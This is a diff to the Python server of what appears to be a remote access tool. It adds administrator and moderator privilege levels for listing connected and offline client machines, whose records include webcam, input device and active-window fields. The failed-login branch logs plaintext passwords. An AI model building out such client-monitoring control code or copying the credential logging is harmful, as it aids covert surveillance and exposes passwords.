@@ -196,9 +196,14 @@ class ModeratServer:
                     else:
                         command, username, password = data.split()
                         if ModeratorsManagment().login_user(username, password):
-                            print '[+] Login Success For Moderator (%s) Session ID (%s)' % (username, session_id)
+                            privs = ModeratorsManagment().get_privs(username)
+                            if privs == 1:
+                                privs_text = 'Administrator'
+                            else:
+                                privs_text = 'Moderator'
+                            print '[+] Login Success For %s (%s) Session ID (%s)' % (privs_text, username, session_id)
                             SessionsManagment().create_session(username, session_id)
-                            moderator_send(sock, 'LoginSuccess', session_id)
+                            moderator_send(sock, 'LoginSuccess %s' % privs, session_id)
 
                         else:
                             print '[!] Login Failed With (%s, %s)' % (username, password)
@@ -208,12 +213,24 @@ class ModeratServer:
                     # Active Moderator
                     while 1:
                         try:
+                            # Moderator Commands
                             client_socket, data = moderator_receive(sock)
                             if data == 'getClients':
                                 username_from_sessions = SessionsManagment().get_session(session_id)
-                                output = self.command_get_clients(username_from_sessions)
+                                privs = ModeratorsManagment().get_privs(username_from_sessions)
+                                if privs == 1:
+                                    output = self.command_get_clients('Administrator')
+                                else:
+                                    output = self.command_get_clients(username_from_sessions)
                             elif data.startswith('setAlias '):
                                 output = ClientsManagment().set_alias(client_socket, data.split()[-1])
+
+                            # Administrator Commands
+                            elif data == 'getModerators' and privs == 1:
+                                print 'getModerators'
+                            elif data == 'getActiveModeratorSessions' and privs == 1:
+                                print 'getActiveModeratorSessions'
+
                             else:
                                 if len(data) != 0:
                                     output = self.command_all(data, client_socket)
@@ -234,7 +251,10 @@ class ModeratServer:
     # Moderator Commands
     def command_get_clients(self, moderator_id):
 
-        clients = ClientsManagment().get_clients(moderator_id)
+        if moderator_id == 'Administrator':
+            clients = ClientsManagment().get_all_clients()
+        else:
+            clients = ClientsManagment().get_clients(moderator_id)
         clients = str(clients)
 
         for i, k in self.socks.iteritems():
@@ -254,6 +274,7 @@ class ModeratServer:
                         'inputdevice': self.socks[i]['inputdevice'],
                         'webcamdevice': self.socks[i]['webcamdevice'],
                         'activewindowtitle': self.streaming_socks[i]['activewindowtitle'],
+                        'moderator': ClientsManagment().get_moderator(self.socks[i]['id']),
                     }
                 except KeyError:
                     pass
@@ -263,8 +284,11 @@ class ModeratServer:
 
         self.clear_offline_clients(self.shared_socks)
 
-        # TODO: OFFLINE
-        offline_clients = ClientsManagment().get_offline_clients(moderator_id)
+        if moderator_id == 'Administrator':
+            offline_clients = ClientsManagment().get_all_offline_clients()
+        else:
+            offline_clients = ClientsManagment().get_offline_clients(moderator_id)
+
         if len(offline_clients) > 0:
             for client in offline_clients:
                 self.shared_socks['OFFLINE_'+client[1]] = {
@@ -282,6 +306,7 @@ class ModeratServer:
                     'webcamdevice': 'OFFLINE',
                     'activewindowtitle': 'OFFLINE',
                     'last_online': client[4],
+                    'moderator': client[0],
                 }
                 if ClientsManagment().is_online(client[1]):
                     del self.shared_socks[client[1]]
